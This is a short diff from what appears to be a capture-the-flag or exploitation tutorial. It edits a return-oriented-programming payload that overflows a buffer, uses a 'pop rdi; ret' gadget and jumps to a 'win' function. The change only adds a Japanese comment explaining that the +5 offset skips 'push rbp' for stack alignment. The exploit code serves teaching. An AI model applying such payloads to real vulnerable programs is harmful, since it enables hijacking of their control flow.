@@ -38,7 +38,7 @@ uv run rop/rop_easy.py
     payload = b'p' * 8 * 5
     payload += p64(next(elf.gadget("pop rdi; ret")))
     payload += p64(0xdeadbeef)
-    payload += p64(elf.symbol("win") + 5)
+    payload += p64(elf.symbol("win") + 5) # インクリメントはアラインメント問題解決用、push rbpをスキップする
     proc.sendline(payload)
     proc.interactive()
 
